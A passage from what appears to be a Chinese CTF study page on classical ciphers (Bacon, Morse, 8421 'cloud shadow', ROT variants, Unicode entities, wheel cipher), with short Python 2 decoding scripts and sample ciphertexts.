class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m) - <span class="number">4</span>, <span class="number">5</span>):</span><br><span class="line">        temp = m[i: i + <span class="number">5</span>]</span><br><span class="line">        output += basic1[temp]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peig2</span>(<span class="params">m</span>):</span></span><br><span class="line">    basic2 = &#123;</span><br><span class="line">    <span class="string">&#x27;AAAAA&#x27;</span> : <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAAAB&#x27;</span> : <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABA&#x27;</span> : <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABB&#x27;</span> : <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAA&#x27;</span> : <span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAB&#x27;</span> : <span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBA&#x27;</span> : <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBB&#x27;</span> : <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAA&#x27;</span> : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAA&#x27;</span> : <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAB&#x27;</span> : <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABA&#x27;</span> : <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABB&#x27;</span> : <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBAA&#x27;</span> : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBAB&#x27;</span> : <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBA&#x27;</span> : <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBB&#x27;</span> : <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAA&#x27;</span> : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAB&#x27;</span> : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABA&#x27;</span> : <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABB&#x27;</span> : <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABB&#x27;</span> : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAA&#x27;</span> : <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAB&#x27;</span> : <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBA&#x27;</span> : <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBB&#x27;</span> : <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m) - <span class="number">4</span>, <span class="number">5</span>):</span><br><span class="line">        temp = m[i: i + <span class="number">5</span>]</span><br><span class="line">        output += basic2[temp]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    m = <span class="string">&quot;aaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba&quot;</span></span><br><span class="line">    mode = <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> len(m)%<span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">        l = []</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(m)/<span class="number">5</span>):</span><br><span class="line">            l.append(m[:<span class="number">5</span>])</span><br><span class="line">            m = m[<span class="number">5</span>:]</span><br><span class="line">        <span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">if</span> i.isupper():</span><br><span class="line">                    k.append(peig1(i))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i = i.upper()</span><br><span class="line">                    k.append(peig1(i))</span><br><span class="line">        <span class="keyword">elif</span> mode == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">if</span> i.isupper():</span><br><span class="line">                    k.append(peig2(i))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i = i.upper()</span><br><span class="line">                    k.append(peig2(i))</span><br><span class="line">        flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">            flag+=i[<span class="number">0</span>]</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;aaaaa&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aaaab&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aaaba&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aaabb&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aabaa&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aabab&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aabba&#x27;</span>:<span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aabbb&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;abaaa&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;abaab&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ababa&#x27;</span>:<span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ababb&#x27;</span>:<span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;abbaa&#x27;</span>:<span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;abbab&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;abbba&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;abbbb&#x27;</span>:<span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;baaaa&#x27;</span>:<span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;baaab&#x27;</span>:<span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;baaba&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;baabb&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;babaa&#x27;</span>:<span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;babab&#x27;</span>:<span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;babba&#x27;</span>:<span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;babbb&#x27;</span>:<span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;bbaaa&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;bbaab&#x27;</span>:<span class="string">&#x27;z&#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">dict2 = &#123;<span class="string">&#x27;.-&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-...&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-.&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-.&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.&#x27;</span>: <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....&#x27;</span>: <span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..&#x27;</span>: <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.---&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-&#x27;</span>: <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-..&#x27;</span>: <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--&#x27;</span>: <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---&#x27;</span>: <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--.&#x27;</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.-&#x27;</span>: <span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-.&#x27;</span>: <span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...&#x27;</span>: <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-&#x27;</span>: <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...-&#x27;</span>: <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--&#x27;</span>: <span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..-&#x27;</span>: <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.--&#x27;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--..&#x27;</span>: <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.----&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..---&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...--&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....-&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.....&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-....&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--...&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---..&#x27;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;----.&#x27;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-----&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27; &#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">enc_str0=<span class="string">&quot;--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dec_str=<span class="string">&quot;&quot;</span></span><br><span class="line">enc_str2=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">enc_str1=enc_str0.split(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc_str1:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    enc_str2 += dict2[i]</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">print(enc_str2)</span><br><span class="line">enc_str2=enc_str2.split(<span class="string">&quot;hhhh&quot;</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc_str2)/<span class="number">5</span>):</span><br><span class="line">    dec_str += dict1[enc_str2[:<span class="number">5</span>]]</span><br><span class="line">    enc_str2=enc_str2[<span class="number">5</span>:]</span><br><span class="line">print(dec_str)</span><br></pre></td></tr></table></figure><h2 id="云影密码8421BCD"><a href="#云影密码8421BCD" class="headerlink" title="云影密码8421BCD"></a>云影密码8421BCD</h2><p>加密方式仅使用01248这5种数字来进行，其中0用来唯一表示间隔，其他数字用加法和表示替换密文。再使用数字1<del>26表示字母A</del>Z。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">steady_dic=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">steady_str=<span class="string">&quot;8842101220480224404014224202480122&quot;</span></span><br><span class="line">steady_str=steady_str.split(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">    steady_sum=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        steady_sum+=int(j)</span><br><span class="line">        <span class="keyword">if</span> steady_sum &gt; <span class="number">26</span>:</span><br><span class="line">            steady_sum=steady_sum%<span class="number">26</span></span><br><span class="line">    print(steady_sum<span class="number">-1</span>)</span><br><span class="line">    steady_flag+=steady_dic[steady_sum<span class="number">-1</span>]</span><br><span class="line">print(steady_flag)</span><br></pre></td></tr></table></figure><h2 id="Rot13"><a href="#Rot13" class="headerlink" title="Rot13"></a>Rot13</h2><p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：</p><p>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为</p><p>1，编码后变成6，以此类推顺序循环。</p><p>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前</p><p>为B，编码后变成O，以此类推顺序循环。</p><p>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。</p><p>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47</p><p>位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用</p><p>于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码，下面以rot13以例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">steady_dic=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">steady_dic1=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">print(steady_dic1)</span><br><span class="line">steady_str=<span class="string">&quot;7=28LE9:D0&gt;2J092AA6?0:?0:?5FDEC:2=04@?EC@=06BF:A&gt;6?EN&quot;</span></span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line">steady_num=<span class="number">13</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">    <span class="keyword">if</span> ord(<span class="string">&#x27;a&#x27;</span>) &lt;= ord(i) <span class="keyword">and</span> ord(i) &lt;= ord(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        num=steady_dic1.index(i)+<span class="number">1</span>+steady_num</span><br><span class="line">        <span class="keyword">if</span> num &gt; <span class="number">26</span>:</span><br><span class="line">            num=num%<span class="number">26</span></span><br><span class="line">        print(num)</span><br><span class="line">        steady_flag+=steady_dic1[num<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">elif</span> ord(<span class="string">&#x27;A&#x27;</span>) &lt;= ord(i) <span class="keyword">and</span> ord(i) &lt;= ord(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        num=steady_dic.index(i)+<span class="number">1</span>+steady_num</span><br><span class="line">        <span class="keyword">if</span> num &gt; <span class="number">26</span>:</span><br><span class="line">            num=num%<span class="number">26</span></span><br><span class="line">        print(num)</span><br><span class="line">        steady_flag+=steady_dic[num<span class="number">-1</span>]   </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        steady_flag+=i</span><br><span class="line">print(steady_flag)</span><br></pre></td></tr></table></figure><h2 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u606d\u559c\u60a8\uff01\u006b\u0065\u0079\u007b\u0074\u0068\u0065\u0020\u0066\u0069\u0072\u0073\u0074\u0020\u006b\u0065\u0079\u007d</span><br></pre></td></tr></table></figure><p>以上编码都是unicode编码，都可以使用工具来解密。</p><h2 id="轮转机加密"><a href="#轮转机加密" class="headerlink" title="轮转机加密"></a>轮转机加密</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">steady_str=<span class="string">&#x27;&#x27;&#x27;1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">steady_content=re.findall(<span class="string">r&#x27;&lt;(.*?)&lt;&#x27;</span>,steady_str)</span><br><span class="line">steady_vi=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">6</span>]</span><br><span class="line">steady_m=<span class="string">&quot;NFQKSEVOQOFNP&quot;</span></span><br><span class="line">steady_new_content=[]</span><br><span class="line">steady_new_content2=[<span class="literal">None</span> <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">13</span>)]</span><br><span class="line">steady_vi2=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(steady_vi)):</span><br><span class="line">    steady_move=steady_vi[i]</span><br><span class="line">    steady_new_content.append(steady_content[steady_move<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(steady_new_content)):</span><br><span class="line">    steady_vi2.append(steady_new_content[j].index(steady_m[j]))</span><br><span class="line"><span class="keyword">for</span> x,y <span class="keyword">in</span> enumerate(steady_new_content):</span><br><span class="line">    steady_new_content2[x]=re.sub(<span class="string">r&quot;  &quot;</span>,<span class="string">&quot;&quot;</span>,y[steady_vi2[x]:]+y[:steady_vi2[x]])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">        steady_flag+=steady_new_content2[j][i]</span><br><span class="line">    print(steady_flag)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mtable = <span class="string">&quot;&quot;&quot;1:&lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span></span><br><span class="line"><span class="string">2:&lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span></span><br><span class="line"><span class="string">3:&lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span></span><br><span class="line"><span class="string">4:&lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span></span><br><span class="line"><span class="string">5:&lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span></span><br><span class="line"><span class="string">6:&lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span></span><br><span class="line"><span class="string">7:&lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span></span><br><span class="line"><span class="string">8:&lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span></span><br><span class="line"><span class="string">9:&lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span></span><br><span class="line"><span class="string">10:&lt; 